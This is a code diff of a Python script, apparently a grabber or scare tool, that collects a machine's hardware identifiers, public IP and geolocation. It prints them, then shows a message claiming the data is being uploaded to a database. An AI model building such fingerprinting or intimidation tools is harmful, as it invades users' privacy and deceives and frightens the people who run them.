@@ -60,6 +60,22 @@ def urFucked():
     # Get HWID
     hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
 
+    # Get MAC Address
+    interface, addrs = next(iter(psutil.net_if_addrs().items()))
+    mac = addrs[0].address
+
+    # GET OS
+    computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
+
+    # Get CPU
+    cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+
+    # Get GPU
+    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+
+    # Get RAM
+    ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
+
     # Get IP and Information
     ip = requests.get('https://api.ipify.org').text
     headers = {
@@ -84,21 +100,6 @@ def urFucked():
     timezone = r.json()['data']['timezone']
     address = r.json()['data']['abuse']['address']
     country = r.json()['data']['abuse']['country']
-
-    interface, addrs = next(iter(psutil.net_if_addrs().items()))
-    mac = addrs[0].address
-
-    # GET OS
-    computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-
-    # Get CPU
-    cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
-
-    # Get GPU
-    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-
-    # Get RAM
-    ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
 
     print(f"""{Fore.RED}[{Fore.RESET}PC Information{Fore.RED}]{Fore.RESET}
 
@@ -125,6 +126,7 @@ def urFucked():
     Write.Print(f"Uploading information to database . . .\n\n", Colors.purple_to_blue, interval=0.025)
     time.sleep(2)
     Write.Print("Finished uploading information to database\n", Colors.purple_to_blue, interval=0.025)
+    Write.Print("Don't skid\n", Colors.purple_to_blue, interval=0.025)
     Write.Print("Press any key to continue . . .", Colors.purple_to_blue, interval=0.025)
     os.system('pause >nul')
     exit
